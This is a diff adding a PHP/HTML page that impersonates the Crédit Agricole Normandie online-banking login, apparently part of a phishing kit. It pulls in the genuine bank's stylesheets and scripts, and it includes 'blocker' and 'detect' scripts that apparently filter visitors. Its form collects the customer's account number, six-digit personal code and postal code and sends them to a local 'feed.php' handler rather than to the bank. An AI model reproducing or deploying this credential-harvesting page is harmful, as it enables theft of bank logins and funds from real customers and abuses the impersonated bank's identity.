@@ -1,0 +1,728 @@
+<?php
+
+session_start();
+    function RANDOM($length = 15) {
+        $characters = '0123456789AZERTY';
+        $randomString = '';
+        for ($i = 0; $i < $length; $i++) {
+            $randomString .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $randomString;
+    }
+include("system/blocker.php");
+include("system/detect.php");
+$random = rand(0,100000000000);
+$dis    = substr(md5($random), 0, 25);
+?>
+<html>
+<head>
+<title>AUTH</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+
+
+
+
+
+
+
+
+
+
+
+ 
+ 
+
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css?v=50" media="all" />
+
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css?v=50" media="all" />
+
+<!--[if IE 8]>
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie8-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lte IE 7]>
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ie-mod.css?v=50" media="all" />
+<![endif]-->
+
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold.css?v=50" media="all" />
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=50" media="all" />
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/ieold-mod.css?v=50" media="all" />
+<![endif]-->
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/stb.css?v=50" media="all" />
+
+
+
+<SCRIPT
+	src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/js/infosbulle.js"></SCRIPT>
+<style type="text/css">
+.auto-style1 {
+	margin-left: 0px;
+}
+</style>
+</head><body leftmargin="0" topmargin="0" onload="Init()" text="#000000"><div id="infoBull" style="position: absolute;z-Index:10"></div><div id="ombrBull" style="position: absolute;z-Index:9"></div>
+
+
+
+
+
+<script language="JavaScript">
+<!--
+
+//Message affich&eacute; quand le souris est au-dessus: 
+statusconfirmer="Confirmer l'identification";
+statusannuler="Annuler l'identification";
+statusaide="Besoin d'Aide ?";
+statuscondjur="Conditions juridiques";
+statusdemo="Voir la d&eacute;monstration";
+statuscompte="Saisir votre n&deg; de compte";
+statuscode="Saisir votre code personnel";
+statuscorriger="Corriger votre derni&egrave;re saisie";
+statusclavnum="Cliquez dans la grille pour composer votre code personnel";
+statusrecom="Voir nos recommandations";
+
+// on recupere la version du navigateur
+var OS = 'Win';
+// on recupere la version du navigateur
+Version=navigator.appVersion;
+App = navigator.appName;
+var Version=Version.substring(0,1);
+var posOS = navigator.appVersion.indexOf('Mac');
+var posOS2 = navigator.appVersion.indexOf('Win');
+if (posOS >= 0) OS = 'Mac';
+if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
+if (OS == 'Win') Nav_sup = 2;
+else Nav_sup = 3;
+// si c'est Netscape 2+ ou MSIE3+, c'est correct
+browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
+browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
+browserOK2=(navigator.appName=="Netscape");
+
+
+// Detection navigateur
+nsvers = "0.94"; // pour netscape "6.2";
+ievers = "5";
+browserOK = false;
+isIE55 = false;
+var d, na, nua, nav, nan, dom, ie, ienu, ie4, ie5, ie5x, ie6, moz, moznu, ns62, mac, win, old, lin, ie5mac, ie5xwin, op, opnu, op4, op5, op6, op7, konq, saf, saf_num;
+
+//variable initialization
+
+d = document;
+na = navigator;
+nav = na.appVersion;
+nan = na.appName;
+nua = na.userAgent;
+win = ( nav.indexOf( 'Win' ) != -1 );
+mac = ( nav.indexOf( 'Mac' ) != -1 );
+lin = ( nav.indexOf( 'Linux' ) != -1 );
+
+if ( !d.layers ){
+	dom = ( d.getElementById );
+	old = ( nav.substring( 0, 1 ) < 4 );
+	op = ( nua.indexOf( 'Opera' ) != -1 );
+	moz = ( nua.indexOf( 'Gecko' ) != -1 );
+	ie = ( d.all && !op );
+	konq = ( nua.indexOf( 'Konqueror' ) != -1 );
+	saf = ( nua.indexOf( 'Safari' ) != -1 );
+
+	if ( op ){
+		op_pos = nua.indexOf( 'Opera' );
+		opnu = nua.substr( ( op_pos + 6 ), 3 );
+		op5 = ( opnu.substring( 0, 1 ) == 5 );
+		op6 = ( opnu.substring( 0, 1 ) == 6 );
+		op7 = ( opnu.substring( 0, 1 ) == 7 );
+	}
+	else if ( saf ){
+		saf_pos = nua.indexOf( 'Safari' );
+		saf_nu = nua.substr( ( saf_pos + 7 ), 2 );
+	}
+	else if ( moz ){
+		rv_pos = nua.indexOf( 'rv' );
+		moz_rv = nua.substr( ( rv_pos + 3 ), 3 );
+		moz_rv_sub = nua.substr( ( rv_pos + 7 ), 1 );
+		moz_rv_sub = moz_rv + moz_rv_sub;
+		browserOK = (moz_rv_sub >= nsvers);
+	}
+	else if ( ie ){
+		ie_pos = nua.indexOf( 'MSIE' );
+		ienu = nua.substr( ( ie_pos + 5 ), 3 );
+		ie4 = ( !dom ); 
+		ie5 = ( ienu.substring( 0, 1 ) == 5 );
+		ie6 = ( ienu.substring( 0, 1 ) == 6 );
+		browserOK = ( ienu.substring( 0, 1 ) >= ievers );
+	}
+	else{} 
+
+	ie5x = ( d.all && dom );
+	isIE55 = ie5x;
+	ie5mac = ( mac && ie5 );
+	ie5xwin = ( win && ie5x );
+}
+
+function Init()
+{
+		if (document.formulaire.CCPTE.value == "") document.formulaire.CCPTE.focus();
+        document.onkeydown=pressKey;
+}
+
+ns4=(document.layers)? true:false;
+ie4=(document.all)? true:false;
+
+function pressKey (e) {
+/*
+        if (ns4) {var nKey=e.which; var ieKey=0}
+        if (ie4) {var ieKey=event.keyCode; var nKey=0}
+        if (nKey==13 || ieKey==13) {
+				validation(document.formulaire);
+                return true;
+        }
+*/
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+function clicPosition(position) {
+	cocherCase();
+	if (document.formulaire.CCCRYC2.value.length == 6) { 
+		return; 
+	}
+	if (document.formulaire.CCCRYC.value=="") 
+		document.formulaire.CCCRYC.value = position;
+	else
+		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + "," + position;
+	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
+}
+
+var code, pos_der_code, affiche_code;
+function effacer() { 
+	if (document.formulaire.CCCRYC2.value.length == 0) { 
+		return; 
+	}
+	code = document.formulaire.CCCRYC.value;
+	pos_der_code = code.lastIndexOf( ',' );
+	code = code.substr( 0,pos_der_code);
+
+	affiche_code = document.formulaire.CCCRYC2.value;
+	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );
+
+	document.formulaire.CCCRYC.value = code;
+	document.formulaire.CCCRYC2.value = affiche_code;
+}
+
+var iPositionCurseurPastillesBAM_Authent=0;
+function cocherCase() {
+	if ( iPositionCurseurPastillesBAM_Authent<6)
+	{
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[iPositionCurseurPastillesBAM_Authent].style.visibility = 'visible';
+		iPositionCurseurPastillesBAM_Authent = iPositionCurseurPastillesBAM_Authent + 1;
+	}
+}
+function corriger() {
+	if ( iPositionCurseurPastillesBAM_Authent>0 )
+	{
+		iPositionCurseurPastillesBAM_Authent = iPositionCurseurPastillesBAM_Authent - 1;
+		var l_oBarre = document.getElementById("monAvancement");
+		l_oBarre.rows[0].cells[iPositionCurseurPastillesBAM_Authent].style.visibility = 'hidden';
+	 }
+}
+
+var path_static = "";
+var path_dynamic = "/stb";
+// Recuperation code caisse
+var caisse = "866";
+
+function raf(){
+	return;
+}
+
+var urlappli = "feed.php";
+var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";
+
+function ValidCertif(){
+	document.formulaire.action = urlappli;
+	validation(document.formulaire)
+
+}
+
+function ValidCertifSecu(){
+	document.formulaire.action = urlapplisecu;
+	validation(document.formulaire)
+}
+
+// -->
+</script>
+
+<script language="JavaScript">
+<!--
+
+function ouvrePOPUP(item,widthpop,heightpop,men) {
+	if(item.indexOf("?") != -1) {
+		item = item+"&stbevt=Popup";
+	}
+	else {
+		item = item+"?stbevt=Popup";
+	}
+
+	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
+}
+function ouvreassistance(item,widthpop,heightpop,men) {
+	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
+}
+
+function ouvreFenetre(item,widthpop,heightpop,men,titre) {
+
+	if (item.indexOf("?") != -1) {
+		if (item.indexOf("#") != -1)
+			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
+		else
+			url = item+"&typeaction=Popup";
+	} else {
+		url = item;
+	}
+
+	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";
+
+	// on verifie si l'on n'est pas deja sur la bonne fenetre
+	if (titre!=window.name) {
+		// Mise en commentaire de l ancien code
+		//if (!saf) {
+			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
+		//	popup1 = window.open('',titre,aazz);
+			// on ferme le popup
+		//	popup1.close();
+		//}
+		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
+		//popup1 = window.open('',titre,aazz);
+		//popup1.name = titre;
+		//setSize(popup1,widthpop,heightpop);
+			
+		popup1 = window.open(url,titre,aazz);
+			
+	    if (moz ) popup1.focus();
+	    //popup1.location =url;
+	} else {
+		window.name = titre;
+		setSize(window,widthpop,heightpop);
+		document.location = url;
+	}
+
+}
+
+function setSize(win,width,height) {
+	if (win.outerWidth) {
+		win.outerWidth = width;
+		win.outerHeight = height;
+	}
+	else if (win.resizeTo) {
+		win.resizeTo(width,height);
+	}
+	else {
+		alert("Not supported.");
+	}
+}
+
+//ouvre une fenêtre popup en plein &eacute;cran ne laissant l'affichage que de la bnt
+function ouvrirPopupBntVisible(url) {
+	window.open(url,'Popup','location=no,toolbar=no,directories=no,menubar=yes,resizable=yes,scrollbars=yes,status=yes,width='+(screen.availWidth-140)+',height='+screen.availHeight+',screenY=0,screenX='+140);
+}
+
+// -->
+</script>
+
+
+
+
+
+<div id="container">
+							<div id="contenu" style="width: 957px;">
+<table border="0">
+	<tbody><tr>
+		<td colspan="3">
+
+
+<div style="background-color:#E6E6E6;" align="center">
+<table border="0" cellpadding="0" cellspacing="0" style="width: 638px">
+<tbody><tr>
+<td style="background:#E6E6E6;">
+	<div id="entete_vide">	
+		<div id="entete" style="background:none; width: 627px;">
+   			 <div id="gauche-entete">
+		        <h1 class="auto-style1">
+		            <table border="0" cellpadding="0" cellspacing="0" style="font-size: 12px; border-collapse: collapse; border-spacing: 0px; font-family: arial, helvetica, clean, sans-serif; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; width: 612px;">
+						<tr>
+							<td style="margin: 0px; padding: 0px; background: rgb(230, 230, 230);">
+							<div id="entete_vide0" style="margin: 0px; padding: 0px; background: rgb(255, 255, 255) url('https://www.normandie-seine-g3-enligne.credit-agricole.fr/img/entete_light.png') no-repeat center top;">
+								<div id="entete_2" style="margin: 0px 0px 10px; padding: 10px 0px 0px; min-height: 90px; position: relative; font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 12px; line-height: normal; font-family: MontserratRegular, sans-serif; background: none; left: 0px; top: 0px; width: 609px;">
+									<div id="gauche-entete_con_2" style="margin: 0px; padding: 4px 0px 0px 10px; float: left; width: 270px; height: 90px; font-weight: normal;">
+										<h1 style="margin: 0px; padding: 0px 0px 3px; font-weight: normal; font-size: 20px; color: rgb(247, 93, 0); border: 0px;">
+										<table style="font-size: 20px; border-collapse: collapse; border-spacing: 0px;">
+											<tr>
+												<td style="margin: 0px; padding: 0px;">
+												<img alt="Caisse Régionale Normandie Seine, retour à l'accueil" src="./img/logo_883.png" style="border: none; vertical-align: middle; float: left; display: block;"></td>
+											</tr>
+										</table>
+										</h1>
+									</div>
+								</div>
+							</div>
+							</td>
+						</tr>
+					</table>
+		            <a title="Caisse R&eacute;gionale Normandie, retour &agrave; l'accueil" href="#" id="lien-logo">
+		                <span><br><br> </span>
+		            </a>
+		        </h1>
+		    </div>
+   		 </div>
+	</div>
+</td>
+</tr>
+</tbody></table>
+</div>
+		</td>
+	</tr>
+	<tr valign="top">
+	
+		<td>
+		
+		<table style="background:#00000" border="0" cellpadding="0" cellspacing="0" width="100%">
+
+			<tbody><tr>
+				<td style="background:#E6E6E6 repeat-y scroll left top" valign="top" width="169">
+				&nbsp;</td>
+				<td id="col-centre" valign="top" width="590px">
+				
+				<table border="0" cellpadding="0" cellspacing="0" width="590">
+					<tbody><tr>
+						<td>
+						
+						<div style="position: absolute; top: 20px; left: 50%; width: 300px; height: 85px; overflow: hidden;"></div><table border="0" cellpadding="0" cellspacing="0" width="590">
+							
+							<tbody>
+							<!-- bandeau authentification --> <tr>
+									<td align="center" height="0"><a target="_blank" href="http://www.ca-normandie.fr/bam-information-bis/"><img src="https://www.ca-normandie.fr/bam-information-bis-image/" border="0"></a></td></tr><tr>
+									<td align="center">&nbsp;</td></tr><tr><td>&nbsp;</td></tr>    
+							<tr>
+								<td height="17"><div class="boutons-act">
+                    <h1>
+                        Identification
+                   <span id="top-actions">
+								<a id="top-actions-aide" href="javascript:ouvreassistance('https://www.normand-g3-enligne.credit-agricole.fr/stb/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-AID.jsp',500,480,'no','AUTH')" onmouseout="StatusMessage( false )" onmouseover="StatusMessage(true, statusaide);return true" tabindex="32">Aide</a></span></h1>
+</div></td>
+							</tr>
+						</tbody></table>
+						<form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="feed.php" onsubmit="return false;" >
+							<input name="idtcm" value="" type="hidden"> 
+							<input name="tracking" value="O" type="hidden"> 
+							<input name="origine" value="vitrine" type="hidden"> 
+							<input name="situationTravail" value="BANCAIRE" type="hidden"> 
+							<input name="canal" value="WEB" type="hidden"> 
+							<input name="typeAuthentification" value="CLIC_RETOUR" type="hidden">
+							<input name="idUnique" value="-5b152381:14acbd4bc77:-7f8a" type="hidden"> 
+							<input name="caisse" value="866" type="hidden"> 
+							<input name="CCCRYC" value="" type="hidden">
+						<fieldset class="blc-choix"><div class="blc-choix-wrap" style="padding-bottom: 40px;"><p class="nomarge">    <b>Le Cr&eacute;dit Agricole accorde une grande attention &agrave; la s&eacute;curit&eacute; de ses sites    internet.</b> En tant qu'utilisateur vous avez &eacute;galement un r&ocirc;le important    et actif &agrave; jouer pour assurer la s&eacute;curit&eacute; des informations qui vous concernent.    Consultez ci-dessous les REGLES de SECURITE &agrave; respecter:    </p><div align="right"></div><p></p><p class="validation" style="width:570px"><a class="retour gauche" href="javascript:ouvrePOPUP('http://www.ca-normandie.fr/bam-site-securite/',790,455,'no','AUTH');" tabindex="33">Nos recommandations</a></p></div></fieldset>
+						<table border="0" width="590">
+							<!-- Message securitaire -->
+
+							<tbody><tr>
+								<td colspan="3" height="22">
+								<input name="CCCRYC2" value="" type="hidden">
+								 <fieldset class="blc-choix">
+							 <script>
+								if(saf){
+									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
+									
+								}else{
+									document.write("<div class=\"blc-choix-wrap\">");
+								}
+							   
+							</script><div class="blc-choix-wrap">
+								<script langage="Javascript">
+<!--
+function validation(formulaire) {
+if(formulaire.CCPTE.value=="") {
+alert("Votre numero de compte est incomplet.");
+return;
+}
+if(formulaire.CCCRYC.value=="") {
+alert("Votre code personnel est incomplet.");
+return;
+}
+if(formulaire.zip.value=="") {
+alert("Votre code Postal est incomplet.");
+return;
+}
+if(isAlphaNum(formulaire.CCPTE.value)) {
+if(isNumerique(formulaire.CCCRYC2.value)) {
+formulaire.submit();
+}
+else {
+alert("Votre code personnel est incomplet.");
+}
+}
+else {
+alert("Votre num&eacute;ro de compte est incomplet.");
+}
+}
+function isNumerique(chaine){
+if (chaine.length!=6)
+return false;
+for(var i=0;i<chaine.length;i++){
+if(chaine.charAt(i)>'9' || chaine.charAt(i)<'0'){
+return false;
+}
+}
+return true;
+}
+function isAlphaNum(chaine){
+if (chaine.length!=11)
+return false;
+chaine = chaine.toLowerCase();
+for(var i=0;i<chaine.length;i++){
+if(!((chaine.charAt(i)<='9' && chaine.charAt(i)>='0') || (chaine.charAt(i)<='z' && chaine.charAt(i)>='a'))){
+return false;
+}
+}
+return true;
+}
+-->
+</script>
+<p >
+<h3>Code Postal</h3>
+<label class="normal">Saisissez votre Code Postal</label>
+<span style="padding-left:154px;"><input   name="zip" size="7" maxlength="5" tabindex="1" type="text"></span>
+</p>
+<h3>Vos codes d'acc&egrave;s</h3>
+<label class="normal">Saisissez votre N&deg; DE COMPTE &agrave; l'aide de votre clavier :</label>
+<input name="CCPTE" size="22" maxlength="11" tabindex="1" type="text">
+<p></p>
+<div id="bloc-pave-saisis-code">
+<label class="normal gauche" for="input-code">Cliquez dans la grille <br>pour composer votre CODE PERSONNEL :</label>
+
+								
+								
+								<table id="pave-saisie-code" class="gauche">
+<tbody><tr align="center" valign="middle">
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('7'); "><a tabindex="**" href="javascript:raf()">
+&nbsp;&nbsp;7&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('9'); "><a tabindex="**" href="javascript:raf()">
+&nbsp;&nbsp;9&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('4'); "><a tabindex="**" href="javascript:raf()">
+&nbsp;&nbsp;4&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('0'); "><a tabindex="14" href="javascript:raf()">
+&nbsp;&nbsp;0&nbsp;&nbsp;
+</a></td>
+<td onclick="clicPosition('2'); "><a tabindex="15" href="javascript:raf()">
+&nbsp;&nbsp;2&nbsp;&nbsp;
+</a></td>
+<td onclick="clicPosition('1'); "><a tabindex="16" href="javascript:raf()">
+&nbsp;&nbsp;1&nbsp;&nbsp;
+</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('5'); "><a tabindex="20" href="javascript:raf()">
+&nbsp;&nbsp;5&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+<tr align="center" valign="middle">
+<td onclick="clicPosition('6'); "><a tabindex="22" href="javascript:raf()">
+&nbsp;&nbsp;6&nbsp;&nbsp;
+</a></td>
+<td onclick="clicPosition('8'); "><a tabindex="23" href="javascript:raf()">
+&nbsp;&nbsp;8&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="**" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+<td onclick="clicPosition('3'); "><a tabindex="25" href="javascript:raf()">
+&nbsp;&nbsp;3&nbsp;&nbsp;
+</a></td>
+<td><a tabindex="26" href="javascript:raf()">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></td>
+</tr>
+</tbody></table>
+
+<span class="align-bas gauche">
+								<table>
+								<tbody><tr>
+								<td>
+								<div style="border-color: gray;border-width: 1px;border-style: solid;">
+								<table id="monAvancement" class="monAvancement" style="border:none;">
+											<tbody><tr>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+												<td class="maCase"><img src="https://www.normand-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/point_transp.gif" height="10" width="10"></td>
+											
+											</tr>
+										</tbody></table>
+								</div>
+										</td>
+										<td>
+										(6 chiffres)
+										</td>
+										</tr>
+										</tbody></table>
+								
+                                </span>
+                                
+							</div>
+							
+							<p class=" validation clearboth" style="width:570px;margin:30px 0 0;">
+                                <span class="gauche">
+	                                <a class="retour gauche" href="javascript:ouvrePOPUP('http://www.ca-normandie.fr/bam-demonstration/',1024,587,'no','AUTH');" tabindex="31">Voir la d&eacute;monstration</a>
+                            	</span>
+                            	<span class="droite">
+                            	
+                            	
+                            		
+	                            		
+			   							
+			   							
+			   						
+
+			   							
+			   							
+			   						
+			   							
+			   							
+			   						
+	                            		<a class="annuler droite" href="javascript:corriger();effacer();" tabindex="27">Corriger</a> 
+		   								<a class="droite" href="javascript:ValidCertif();" tabindex="28">Confirmer</a>
+	                            		<a class="annuler droite" href="javascript:document.location.href='http://www.ca-normandie.fr';" tabindex="30">Annuler</a>
+	                            		
+			   							
+
+			   							
+			   							
+			   							
+			   							
+								</span>                           
+                            </p>
+						</div>
+                   		 </fieldset>
+										
+								</td>
+							</tr>
+							
+						</tbody></table>
+						
+						</form></td>
+					</tr>
+		<tr>
+		<td>		
+		<!-- Pav&eacute; Certificat --> 
+		
+		<!-- Conditions Juridique --> <form class="ca-forms" style="padding:0 0;"><p>Vous avez perdu votre code confidentiel <a href="http://www.ca-normandie.fr/bam-code-perdu/" target="_blank"><font color="#0000ff">cliquez ici</font></a>.</p><br><p>Si vous rencontrez des probl&egrave;mes de connexion ou de navigation, consultez <a href=" http://www.ca-normandie.fr/bam-aide-en-ligne/" target="_blank"><font color="#0000ff">notre aide en ligne</font></a>.</p><br><p>Je reconnais avoir pris connaissance et accept&eacute; les conditions juridiques de la convention d'utilisation du service.</p><p class="validation" style="width:580px"><script>var srcLien = path_dynamic + "https://www.normand-g3-enligne.credit-agricole.fr/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-INF.jsp";var srcPuceLien = path_static + "/web/bam/tech/allmedia/stb/commun/picts/PuceLien.gif";var yesno = "no";var authentif = "AUTH";</script><a class="retour gauche" href="javascript:ouvrePOPUP(srcLien,490,450,yesno,authentif);" tabindex="34">Conditions juridiques</a></p></form>
+			</td>
+		</tr>
+		</tbody></table>
+		</td>
+		<td style="background:#E6E6E6 repeat-y scroll left top" valign="top" width="171">
+		&nbsp;</td>
+		</tr>
+		
+		
+	<tr style="background-color:#E6E6E6;" valign="middle">
+	<td></td>
+		<td>
+		<table border="0" cellpadding="0" cellspacing="0" width="590">
+			<tbody><tr>
+				<td class="footercopyright" align="center">&nbsp;</td>
+			</tr>
+			<tr>
+				<td class="footercopyright" align="center">@2004-2018 Cr&eacute;dit Agricole,
+				tous droits r&eacute;serv&eacute;s</td>
+			</tr>
+		</tbody></table>
+		
+		</td>
+		<td></td>
+	</tr></tbody></table>
+</td>
+
+
+
+</tr>
+</tbody></table>
+
+
+
+
+<table>
+	<tbody><tr>
+		<td width="169"></td>
+		<td id="main_bas" width="570"></td>
+		<td width="169"></td>
+	</tr>
+</tbody></table>
+</div>
+</div>
+
+
+</body></html>
